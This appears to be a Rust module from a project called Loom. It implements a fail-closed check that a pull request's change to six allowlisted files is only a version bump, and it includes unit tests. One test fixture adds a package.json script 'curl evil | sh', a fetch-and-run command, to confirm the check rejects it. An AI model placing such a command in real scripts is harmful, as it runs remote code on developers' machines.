//! `loom-daemon forge version-only-diff <pr> <file>` (#9611) — the fail-closed
//! decision behind Champion criterion #3's version-only carve-out (#6147).
//!
//! # What the question is
//!
//! Criterion #3 hard-fails any PR touching a critical file. The six
//! version-bearing files ([`ALLOWLIST`]) are rewritten with nothing but a
//! version-string change on every version bump, so the carve-out exempts one of
//! them when, and only when, every changed line in its diff is that format's
//! version line. A PASS here is a *release* condition for a standing
//! `champion:critical-file-hold`, so the verb exits 0 only on positive
//! evidence.
//!
//! # Why it moved out of the prompt
//!
//! The prompt used to answer this inline with
//! `gh api … --jq --arg f "$file" '…'`. `gh api --jq` takes one expression and
//! has no jq `--arg`, so that call errored on every run, and the function's
//! only verdict, `[ -z "$bad_lines" ]`, read the empty output of a failed fetch
//! as "every changed line matched". It returned PASS for every one of the six
//! files no matter what the diff contained (#9611).
//!
//! # Fail closed
//!
//! Exit 0 (`VERSION_ONLY=1` on stdout) requires all of:
//!
//! - `file` is exactly one of [`ALLOWLIST`] (string equality, never a
//!   substring — `some-crate/Cargo.toml` is out of scope);
//! - every fetched page of `pulls/<pr>/files` succeeded and parsed;
//! - `file` is in that list with a non-empty `patch` (GitHub omits `patch` for
//!   large or binary diffs);
//! - the patch has at least one `+`/`-` content line;
//! - every such line matches the format's version-line pattern
//!   ([`JSON_VERSION_LINE`] / [`TOML_VERSION_LINE`], kept byte-identical to the
//!   ERE the prompt shipped).
//!
//! Every other outcome exits 1 with a one-line reason on stderr. A caller
//! treats **any** non-zero exit (including clap's 2 on a daemon predating this
//! verb, and the shell's 126/127 for a missing binary) as "not eligible".

use std::path::Path;

use anyhow::Result;
use regex::Regex;
use serde::Deserialize;

/// The six version-bearing files the carve-out may exempt — and nothing else.
pub const ALLOWLIST: [&str; 6] = [
    "package.json",
    "mcp-loom/package.json",
    "mcp-loom/package-lock.json",
    "loom-daemon/Cargo.toml",
    "loom-api/Cargo.toml",
    "Cargo.lock",
];

/// JSON version line: `  "version": "X.Y.Z",` at any indentation.
pub const JSON_VERSION_LINE: &str =
    r#"^[+-][[:space:]]*"version":[[:space:]]*"[0-9]+\.[0-9]+\.[0-9]+",?[[:space:]]*$"#;

/// TOML version line: `version = "X.Y.Z"`. `Cargo.lock` repeats it once per
/// touched `[[package]]` block, so several changed pairs are still eligible.
pub const TOML_VERSION_LINE: &str = r#"^[+-]version = "[0-9]+\.[0-9]+\.[0-9]+"[[:space:]]*$"#;

/// `per_page` for the file-list read (GitHub's maximum).
const PAGE_SIZE: usize = 100;

/// GitHub's `pulls/<n>/files` stops at 3000 files, i.e. 30 full pages. A file
/// not found by then is "not in the list" — not eligible.
const MAX_PAGES: u32 = 30;

/// Why a file is NOT eligible for the carve-out. Every variant exits 1.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reason {
    /// Not one of the six [`ALLOWLIST`] paths.
    NotAllowlisted,
    /// `--repo` was not a plain `OWNER/REPO`.
    InvalidRepo,
    /// A page fetch failed or did not parse as the expected file list.
    FetchFailed(String),
    /// The file is not in the PR's changed-file list.
    FileNotInList,
    /// The file's entry carries no `patch` (large or binary diff).
    PatchAbsent,
    /// The file's `patch` is the empty string.
    PatchEmpty,
    /// The patch has no `+`/`-` content line at all.
    NoChangedLines,
    /// A changed line that is not the version line.
    NonVersionLine(String),
    /// The version-line pattern failed to compile (an internal defect, not a
    /// forge failure); still fails closed.
    BadPattern(String),
}

impl std::fmt::Display for Reason {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NotAllowlisted => f.write_str("not one of the 6 version-bearing files"),
            Self::InvalidRepo => f.write_str("--repo is not a plain OWNER/REPO"),
            Self::FetchFailed(why) => write!(f, "could not read the PR's file list: {why}"),
            Self::FileNotInList => f.write_str("file is not in the PR's changed-file list"),
            Self::PatchAbsent => f.write_str("the forge returned no patch (large or binary diff)"),
            Self::PatchEmpty => f.write_str("the forge returned an empty patch"),
            Self::NoChangedLines => f.write_str("the patch has no +/- content line"),
            Self::NonVersionLine(line) => write!(f, "changed line is not a version line: {line}"),
            Self::BadPattern(why) => write!(f, "version-line pattern did not compile: {why}"),
        }
    }
}

/// The version-line pattern for an allowlisted `file`; `None` otherwise.
fn pattern_for(file: &str) -> Option<&'static str> {
    match file {
        "package.json" | "mcp-loom/package.json" | "mcp-loom/package-lock.json" => {
            Some(JSON_VERSION_LINE)
        }
        "loom-daemon/Cargo.toml" | "loom-api/Cargo.toml" | "Cargo.lock" => Some(TOML_VERSION_LINE),
        _ => None,
    }
}

/// The pure decision: is `patch` (the forge's `patch` field for `file`, or
/// `None` when it was absent) a version-only change?
///
/// `+++`/`---` file-header lines are skipped only before the first `@@` hunk
/// header — inside a hunk every `+`/`-` line is content and must match, so a
/// removed line that happens to start with `--` cannot slip through.
///
/// # Errors
///
/// The [`Reason`] the file is not eligible.
pub fn version_only(file: &str, patch: Option<&str>) -> Result<(), Reason> {
    let pattern = pattern_for(file).ok_or(Reason::NotAllowlisted)?;
    let patch = patch.ok_or(Reason::PatchAbsent)?;
    if patch.is_empty() {
        return Err(Reason::PatchEmpty);
    }
    // The patterns are compile-time constants covered by the tests below.
    let re = Regex::new(pattern).map_err(|e| Reason::BadPattern(e.to_string()))?;
    let mut in_hunk = false;
    let mut changed = 0usize;
    for line in patch.split('\n') {
        if line.starts_with("@@") {
            in_hunk = true;
            continue;
        }
        if !in_hunk && (line.starts_with("+++") || line.starts_with("---")) {
            continue;
        }
        if !(line.starts_with('+') || line.starts_with('-')) {
            continue;
        }
        changed += 1;
        if !re.is_match(line) {
            return Err(Reason::NonVersionLine(line.to_string()));
        }
    }
    if changed == 0 {
        return Err(Reason::NoChangedLines);
    }
    Ok(())
}

/// One entry of a `pulls/<n>/files` page. `filename` is required, so an entry
/// without it fails the whole page.
#[derive(Deserialize)]
struct FileEntry {
    filename: String,
    #[serde(default)]
    patch: Option<String>,
}

/// Walk the file list page by page through `fetch_page` (1-based page number
/// to raw JSON body) and return `file`'s `patch` field.
///
/// # Errors
///
/// [`Reason::FetchFailed`] on any fetch or parse failure,
/// [`Reason::FileNotInList`] when the list ends without `file`.
fn find_patch<F>(file: &str, mut fetch_page: F) -> Result<Option<String>, Reason>
where
    F: FnMut(u32) -> Result<Vec<u8>, String>,
{
    for page in 1..=MAX_PAGES {
        let body = fetch_page(page).map_err(Reason::FetchFailed)?;
        let entries: Vec<FileEntry> = serde_json::from_slice(&body)
            .map_err(|e| Reason::FetchFailed(format!("page {page} did not parse: {e}")))?;
        let full = entries.len() >= PAGE_SIZE;
        if let Some(entry) = entries.into_iter().find(|e| e.filename == file) {
            return Ok(entry.patch);
        }
        if !full {
            break;
        }
    }
    Err(Reason::FileNotInList)
}

/// The whole verdict with the fetch injected: allowlist first (no forge call
/// for an ineligible name), then the file's patch, then [`version_only`].
///
/// # Errors
///
/// The [`Reason`] the file is not eligible.
pub fn decide<F>(file: &str, fetch_page: F) -> Result<(), Reason>
where
    F: FnMut(u32) -> Result<Vec<u8>, String>,
{
    if pattern_for(file).is_none() {
        return Err(Reason::NotAllowlisted);
    }
    let patch = find_patch(file, fetch_page)?;
    version_only(file, patch.as_deref())
}

/// Is `repo` a plain `OWNER/REPO`? It is interpolated into an API path, so
/// `..`, extra `/` or anything outside `[A-Za-z0-9._-]` is refused.
fn valid_repo(repo: &str) -> bool {
    let mut parts = repo.split('/');
    let ok = |s: Option<&str>| {
        s.is_some_and(|s| {
            !s.is_empty()
                && s != "."
                && s != ".."
                && s.bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
        })
    };
    ok(parts.next()) && ok(parts.next()) && parts.next().is_none()
}

/// Production fetcher: one `gh api` page read through the counted facade.
fn gh_fetch_page(gh_bin: &Path, repo: &str, pr: u32, page: u32) -> Result<Vec<u8>, String> {
    let path = format!("repos/{repo}/pulls/{pr}/files?per_page={PAGE_SIZE}&page={page}");
    crate::verdict_equivalence::gh_api("forge.version_only_diff", gh_bin, None, &path)
        .ok_or_else(|| format!("`gh api {path}` failed"))
}

/// Parsed `forge version-only-diff` arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Args {
    /// Pull request number.
    pub pr: u32,
    /// Repo-relative path of the changed file.
    pub file: String,
    /// `OWNER/REPO`; `None` lets `gh` resolve `{owner}/{repo}`.
    pub repo: Option<String>,
}

/// Handle `loom-daemon forge version-only-diff <pr> <file> [--repo OWNER/REPO]`.
/// Never returns (exits): 0 with `VERSION_ONLY=1` on stdout when eligible,
/// otherwise 1 with the reason on stderr.
pub fn handle(args: &Args) -> Result<()> {
    let (pr, file) = (args.pr, args.file.as_str());
    let repo = args.repo.as_deref();
    let verdict = match repo {
        Some(r) if !valid_repo(r) => Err(Reason::InvalidRepo),
        _ => {
            let repo = repo.unwrap_or("{owner}/{repo}");
            let gh = crate::forge_cmd::gh_bin();
            decide(file, |page| gh_fetch_page(Path::new(&gh), repo, pr, page))
        }
    };
    match verdict {
        Ok(()) => {
            println!("VERSION_ONLY=1");
            std::process::exit(0);
        }
        Err(reason) => {
            eprintln!("loom-daemon forge version-only-diff: {file} not eligible: {reason}");
            std::process::exit(1);
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    /// The PR #6118 fixtures (`test-champion-critical-file-check.sh`), one per
    /// allowlisted file.
    const PR6118: [(&str, &str); 6] = [
        (
            "loom-api/Cargo.toml",
            "@@ -1,6 +1,6 @@\n [package]\n name = \"loom-api\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n edition = \"2021\"\n description = \"External REST API for Loom analytics data access\"\n ",
        ),
        (
            "loom-daemon/Cargo.toml",
            "@@ -1,6 +1,6 @@\n [package]\n name = \"loom-daemon\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n edition = \"2021\"\n \n [dependencies]",
        ),
        (
            "Cargo.lock",
            "@@ -1247,7 +1247,7 @@ checksum = \"0ceec5bc\"\n \n [[package]]\n name = \"loom-api\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n dependencies = [\n \"anyhow\",\n@@ -1265,7 +1265,7 @@ dependencies = [\n \n [[package]]\n name = \"loom-daemon\"\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n dependencies = [\n \"anyhow\",",
        ),
        (
            "package.json",
            "@@ -1,6 +1,6 @@\n {\n   \"name\": \"loom\",\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n   \"description\": \"AI-powered development orchestration...\",\n   \"type\": \"module\",",
        ),
        (
            "mcp-loom/package.json",
            "@@ -1,6 +1,6 @@\n {\n   \"name\": \"@loom/mcp\",\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n   \"description\": \"Unified MCP server for Loom\",\n   \"type\": \"module\",",
        ),
        (
            "mcp-loom/package-lock.json",
            "@@ -1,12 +1,12 @@\n {\n   \"name\": \"@loom/mcp\",\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n   \"lockfileVersion\": 3,\n   \"requires\": true,\n   \"packages\": {\n     \"\": {\n       \"name\": \"@loom/mcp\",\n-      \"version\": \"0.18.38\",\n+      \"version\": \"0.18.39\",\n       \"dependencies\": {",
        ),
    ];

    /// A one-page fetcher answering `body` for page 1 and failing any other.
    fn one_page(body: String) -> impl FnMut(u32) -> Result<Vec<u8>, String> {
        move |page| {
            if page == 1 {
                Ok(body.clone().into_bytes())
            } else {
                Err(format!("unexpected page {page}"))
            }
        }
    }

    fn page_with(file: &str, patch: Option<&str>) -> String {
        let mut entry = serde_json::json!({"filename": file});
        if let Some(p) = patch {
            entry["patch"] = serde_json::Value::String(p.to_string());
        }
        serde_json::json!([{"filename": "src/lib.rs", "patch": "@@ -1 +1 @@\n-a\n+b"}, entry])
            .to_string()
    }

    /// (a) a failing fetch is never eligible.
    #[test]
    fn fetch_error_is_not_eligible() {
        let r = decide("package.json", |_| Err("accepts 1 arg(s), received 4".into()));
        assert!(matches!(r, Err(Reason::FetchFailed(_))), "{r:?}");
        // Unparseable JSON and a non-array body fail the same way.
        let r = decide("package.json", one_page("not json".into()));
        assert!(matches!(r, Err(Reason::FetchFailed(_))), "{r:?}");
        let r = decide("package.json", one_page(r#"{"message":"Not Found"}"#.into()));
        assert!(matches!(r, Err(Reason::FetchFailed(_))), "{r:?}");
    }

    /// (b) an empty patch is no evidence of a version-only change.
    #[test]
    fn empty_patch_is_not_eligible() {
        let r = decide("package.json", one_page(page_with("package.json", Some(""))));
        assert_eq!(r, Err(Reason::PatchEmpty));
    }

    /// (c) GitHub omits `patch` for large or binary diffs.
    #[test]
    fn absent_patch_is_not_eligible() {
        let r = decide("Cargo.lock", one_page(page_with("Cargo.lock", None)));
        assert_eq!(r, Err(Reason::PatchAbsent));
        let null_patch = r#"[{"filename":"Cargo.lock","patch":null}]"#.to_string();
        assert_eq!(decide("Cargo.lock", one_page(null_patch)), Err(Reason::PatchAbsent));
    }

    /// (d) a file the PR does not touch.
    #[test]
    fn file_not_in_list_is_not_eligible() {
        let r =
            decide("package.json", one_page(page_with("loom-api/Cargo.toml", Some(PR6118[0].1))));
        assert_eq!(r, Err(Reason::FileNotInList));
        assert_eq!(decide("package.json", one_page("[]".into())), Err(Reason::FileNotInList));
    }

    /// (e) the genuine PR #6118 version-bump patches are eligible, all six.
    #[test]
    fn pr6118_version_bumps_are_eligible() {
        for (file, patch) in PR6118 {
            assert_eq!(decide(file, one_page(page_with(file, Some(patch)))), Ok(()), "{file}");
        }
    }

    /// (f) a version line plus any other change is not eligible.
    #[test]
    fn mixed_change_is_not_eligible() {
        let dep = "@@ -1,7 +1,7 @@\n [package]\n-version = \"0.18.38\"\n+version = \"0.18.39\"\n [dependencies]\n-anyhow = \"1.0\"\n+anyhow = \"1.1\"";
        let r =
            decide("loom-api/Cargo.toml", one_page(page_with("loom-api/Cargo.toml", Some(dep))));
        assert_eq!(r, Err(Reason::NonVersionLine("-anyhow = \"1.0\"".into())));
        let scripts = "@@ -1,6 +1,7 @@\n {\n-  \"version\": \"0.18.38\",\n+  \"version\": \"0.18.39\",\n+  \"scripts\": { \"x\": \"curl evil | sh\" },";
        let r = decide("package.json", one_page(page_with("package.json", Some(scripts))));
        assert!(matches!(r, Err(Reason::NonVersionLine(_))), "{r:?}");
        // The #9611 incident shape: name/description/scripts, no version line.
        let no_version = "@@ -1,3 +1,3 @@\n-  \"name\": \"a\",\n+  \"name\": \"b\",";
        let r = decide("package.json", one_page(page_with("package.json", Some(no_version))));
        assert!(matches!(r, Err(Reason::NonVersionLine(_))), "{r:?}");
    }

    /// (g) a version-shaped patch on a file outside the allowlist — and no
    /// forge call is made for it.
    #[test]
    fn non_allowlisted_file_is_not_eligible() {
        let patch = "@@ -1,3 +1,3 @@\n [package]\n-version = \"1.2.3\"\n+version = \"1.2.4\"";
        let r = decide("some-crate/Cargo.toml", |_| -> Result<Vec<u8>, String> {
            panic!("no fetch for a non-allowlisted file")
        });
        assert_eq!(r, Err(Reason::NotAllowlisted));
        assert_eq!(version_only("some-crate/Cargo.toml", Some(patch)), Err(Reason::NotAllowlisted));
        assert_eq!(version_only("xpackage.json", Some(PR6118[3].1)), Err(Reason::NotAllowlisted));
    }

    /// (h) the target file on page 2 of a multi-page list is found; a failing
    /// page 2 is a fetch failure, never "not in list".
    #[test]
    fn target_on_second_page_is_found() {
        let page1: Vec<serde_json::Value> = (0..PAGE_SIZE)
            .map(|i| serde_json::json!({"filename": format!("src/f{i}.rs"), "patch": "@@ -1 +1 @@\n-a\n+b"}))
            .collect();
        let page1 = serde_json::Value::Array(page1).to_string();
        let page2 = page_with("Cargo.lock", Some(PR6118[2].1));
        let mut pages_seen = Vec::new();
        let r = decide("Cargo.lock", |page| {
            pages_seen.push(page);
            match page {
                1 => Ok(page1.clone().into_bytes()),
                2 => Ok(page2.clone().into_bytes()),
                _ => Err("past the end".into()),
            }
        });
        assert_eq!(r, Ok(()));
        assert_eq!(pages_seen, vec![1, 2]);
        let r = decide("Cargo.lock", |page| match page {
            1 => Ok(page1.clone().into_bytes()),
            _ => Err("HTTP 502".into()),
        });
        assert!(matches!(r, Err(Reason::FetchFailed(_))), "{r:?}");
    }

    #[test]
    fn no_changed_lines_is_not_eligible() {
        let ctx = "@@ -1,2 +1,2 @@\n [package]\n name = \"x\"";
        assert_eq!(version_only("Cargo.lock", Some(ctx)), Err(Reason::NoChangedLines));
    }

    #[test]
    fn dash_dash_content_line_inside_a_hunk_still_counts() {
        let patch = "@@ -1,2 +1,2 @@\n-version = \"1.0.0\"\n+version = \"1.0.1\"\n--- not a header";
        assert!(matches!(
            version_only("Cargo.lock", Some(patch)),
            Err(Reason::NonVersionLine(_))
        ));
        let headed = "--- a/Cargo.lock\n+++ b/Cargo.lock\n@@ -1 +1 @@\n-version = \"1.0.0\"\n+version = \"1.0.1\"";
        assert_eq!(version_only("Cargo.lock", Some(headed)), Ok(()));
    }

    #[test]
    fn repo_argument_is_validated() {
        assert!(valid_repo("rjwalters/loom"));
        assert!(valid_repo("a-b/c.d_e"));
        for bad in ["", "loom", "a/b/c", "../x", "a/..", "a/b?x=1", "a /b"] {
            assert!(!valid_repo(bad), "{bad}");
        }
    }
}
